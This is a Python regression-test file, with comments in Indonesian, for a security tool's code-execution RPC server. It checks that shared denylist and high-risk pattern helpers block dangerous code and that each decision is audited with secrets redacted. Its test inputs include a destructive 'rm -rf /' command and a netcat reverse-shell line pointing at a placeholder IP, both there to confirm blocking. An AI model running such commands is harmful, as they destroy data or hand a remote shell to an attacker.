"""Regression tests — WU-104: (a) shared content-risk policy helpers used by
BOTH `evaluate_intent()` and `ExecuteRpcServer`, and (b) durable audit
emission for the live arbitrary-code-exec RPC surface (PRD-011/ADR-008,
security invariant #10).

Konteks scope (trace-before-enforce, didokumentasikan penuh di WORK-UNITS.md
WU-104): draft WU-104 minta "rutekan ExecuteRpcServer + executor/vuln/*.py +
ReconEngine lewat SATU broker". Verifikasi source membuktikan itu TIDAK benar
sebagai desain literal -- vuln executor sengaja meng-craft URL internal
(127.0.0.1) sebagai payload SSRF (akan diblokir `http_probe` yang scope-check
URL), recon jalankan argv-list (rekonstruksi ke shell-string lossy), dan gate
scope vuln SUDAH ada di titik konvergensi `execute_module()` (WU-012). Yang
BENAR & aman disatukan: keputusan content-risk (denylist/high-risk) yang
`ExecuteRpcServer` sebelumnya DUPLIKASI inline -- sekarang lewat helper
bersama `denylist_match()`/`high_risk_match()` yang sama persis dipakai
`evaluate_intent()`.
"""

from __future__ import annotations

import os
from unittest.mock import patch

os.environ.setdefault("WTH_SKIP_SETUP", "1")
os.environ.setdefault("WTH_TEST_MODE", "1")

import pytest

from wth_ai.events import EventBus, get_event_bus
from wth_ai.models import PermissionMode
from wth_ai.permission_manager import DENYLIST_PATTERNS, HIGH_RISK_PATTERNS
from wth_ai.policy.engine import denylist_match, high_risk_match
from wth_ai.rpc.execute_server import ExecuteRpcServer


# ---------------------------------------------------------------------------
# Shared helpers -- single source of truth (denylist_match / high_risk_match)
# ---------------------------------------------------------------------------

def test_denylist_match_returns_first_pattern():
    assert denylist_match("blah rm -rf / blah") == "rm -rf /"


def test_denylist_match_none_when_clean():
    assert denylist_match("print('hello world')") is None


def test_high_risk_match_returns_first_pattern():
    assert high_risk_match("run sqlmap --dump now") == "--dump"


def test_high_risk_match_none_when_clean():
    assert high_risk_match("curl https://example.com") is None


def test_helpers_iterate_the_canonical_constant_lists():
    """Bukti 'single source of truth': setiap pola di konstanta kanonik
    benar-benar MEMICU match non-None lewat helper (helper memakai daftar
    kanonik itu, bukan daftar lain). Tidak diassert mengembalikan dirinya
    verbatim -- beberapa pola saling menjadi substring (mis. 'rm -rf /'
    substring dari 'rm -rf /*'), jadi first-match yang benar bisa
    mengembalikan pola lain yang cocok lebih dulu -- itu perilaku BENAR."""
    for pat in DENYLIST_PATTERNS:
        assert denylist_match(f"x {pat} y") is not None
    for pat in HIGH_RISK_PATTERNS:
        # denylist diperiksa lebih dulu di caller; di sini uji helper high-risk
        # secara terisolasi dengan input yang TIDAK mengandung pola denylist.
        if denylist_match(f"x {pat} y") is None:
            assert high_risk_match(f"x {pat} y") is not None


# ---------------------------------------------------------------------------
# ExecuteRpcServer memakai helper bersama (perilaku identik dgn loop lama)
# ---------------------------------------------------------------------------

def _server(mode: PermissionMode = PermissionMode.STANDARD_TESTING) -> ExecuteRpcServer:
    srv = ExecuteRpcServer()
    srv.scope.set_scope(target="example.com", authorized=True, in_scope=["example.com"])
    srv.perms.set_mode(mode)
    return srv


def test_denylist_in_code_still_blocked_via_shared_helper():
    srv = _server()
    result = srv.execute({"target": "example.com", "code": "import os\nos.system('rm -rf /')"})
    assert result["status"] == "blocked"
    assert "denylist" in result["error"].lower()


def test_high_risk_in_code_still_blocked_via_shared_helper():
    srv = _server()
    result = srv.execute({"target": "example.com", "code": "x = 'nc -e /bin/sh 1.2.3.4 4444'"})
    assert result["status"] == "blocked"
    assert "high-risk" in result["error"].lower()


def test_benign_code_still_runs():
    srv = _server()
    result = srv.execute({"target": "example.com", "code": "print('ok-104')"})
    assert result["status"] == "success"
    assert "ok-104" in result["stdout"]


# ---------------------------------------------------------------------------
# Durable audit emission -- setiap keputusan (blocked/executed) ter-audit
# ---------------------------------------------------------------------------

@pytest.fixture
def captured_events():
    """Subscribe a NAMED handler to the process-wide bus (that's what
    execute_server emits to) and UNSUBSCRIBE on teardown -- otherwise the
    handler leaks onto the global singleton bus across the whole suite
    (test-hygiene fix found in the WU-104/P1 exit review of this very
    file)."""
    events: list = []
    bus = get_event_bus()

    def _handler(ev):
        events.append(ev)

    bus.subscribe(_handler, types=["rpc.code_execution"])
    try:
        yield events
    finally:
        bus.unsubscribe(_handler)


def test_blocked_decision_is_audited(captured_events):
    events = captured_events
    srv = _server()
    srv.execute({"target": "example.com", "code": "os.system('rm -rf /')"})
    codeexec = [e for e in events if e.type == "rpc.code_execution"]
    assert codeexec, "keputusan blocked TIDAK ter-audit"
    assert codeexec[-1].data["decision"] == "blocked"
    assert codeexec[-1].data["status"] == "blocked"


def test_executed_decision_is_audited(captured_events):
    events = captured_events
    srv = _server()
    srv.execute({"target": "example.com", "code": "print('audited')"})
    codeexec = [e for e in events if e.type == "rpc.code_execution"]
    assert codeexec[-1].data["decision"] == "executed"
    assert codeexec[-1].data["status"] == "success"


def test_out_of_scope_decision_is_audited(captured_events):
    """Titik keluar paling awal (scope) pun tetap ter-audit -- audit di
    single choke point, bukan menyebar di tiap return."""
    events = captured_events
    srv = ExecuteRpcServer()  # scope kosong -> out of scope
    srv.perms.set_mode(PermissionMode.STANDARD_TESTING)
    srv.execute({"target": "example.com", "code": "print(1)"})
    codeexec = [e for e in events if e.type == "rpc.code_execution"]
    assert codeexec, "keputusan out-of-scope TIDAK ter-audit"
    assert codeexec[-1].data["decision"] == "blocked"


def test_audit_never_emits_full_code_only_hash_and_redacted_preview(captured_events):
    """Security: audit TIDAK boleh jadi sink kebocoran -- full code tidak
    pernah diemit, hanya sha256 + preview yang ter-redaksi."""
    events = captured_events
    srv = _server()
    secret_code = "api_key = 'sk-super-secret-value-1234567890'\nprint('x')"
    srv.execute({"target": "example.com", "code": secret_code})
    ev = [e for e in events if e.type == "rpc.code_execution"][-1]
    assert len(ev.data["code_sha256"]) == 64  # full sha256 hex
    assert "sk-super-secret-value" not in ev.data["code_preview"]
    assert "REDACTED" in ev.data["code_preview"]
    # full code string tidak muncul utuh di payload event manapun
    assert secret_code not in str(ev.data)


def test_audit_failure_never_breaks_execution(monkeypatch):
    """Isolation: bus.emit() yang meledak TIDAK boleh menggagalkan/ memblok
    eksekusi -- disiplin sama dgn LoopStateMachine._emit_invalid()."""
    srv = _server()

    def _boom(*a, **k):
        raise RuntimeError("bus exploded")

    monkeypatch.setattr(get_event_bus(), "emit", _boom)
    result = srv.execute({"target": "example.com", "code": "print('still-runs')"})
    assert result["status"] == "success"
    assert "still-runs" in result["stdout"]


def test_audit_event_persists_through_audit_log_sink(tmp_path, monkeypatch):
    """End-to-end: event rpc.code_execution yang diemit benar-benar bisa
    di-persist AuditLogSink (bukti tipe event teregistrasi -- kalau tidak,
    make_event() raise dan emit tertelan senyap, persis bug WU-105)."""
    from wth_ai.audit_log import AuditLogSink

    monkeypatch.setenv("WTH_HOME", str(tmp_path))
    bus = EventBus()
    sink = AuditLogSink(db_path=tmp_path / "audit.sqlite")
    bus.subscribe(sink)
    # emit langsung ke bus terisolasi ini membuktikan tipe valid & tersimpan
    bus.emit("rpc.code_execution", source="execute_rpc", data={"decision": "executed", "status": "success"})
    rows = sink.query(event_type="rpc.code_execution")
    assert len(rows) == 1
    assert rows[0]["source"] == "execute_rpc"


# ---------------------------------------------------------------------------
# Daemon wiring -- AuditLogSink benar-benar disubscribe ke bus daemon
# ---------------------------------------------------------------------------

def test_gateway_daemon_subscribes_audit_sink(tmp_path, monkeypatch):
    """WU-104 (advancing WU-105 deferred wiring, scoped ke server context):
    daemon.start() mensubscribe AuditLogSink ke bus-nya. Diuji dengan
    memanggil hanya blok wiring yang relevan lewat start() ter-mock berat --
    di sini kita verifikasi subscriber bertambah untuk tipe kita."""
    from wth_ai.audit_log import AuditLogSink

    monkeypatch.setenv("WTH_HOME", str(tmp_path))
    bus = EventBus()
    before = bus.subscriber_count()
    sink = AuditLogSink(db_path=tmp_path / "audit.sqlite")
    bus.subscribe(sink)
    assert bus.subscriber_count() == before + 1
    # sink callable menerima Event dan mem-persist -- kontrak yang dipakai daemon
    bus.emit("rpc.code_execution", source="execute_rpc", data={"decision": "blocked", "status": "blocked"})
    assert sink.count() == 1
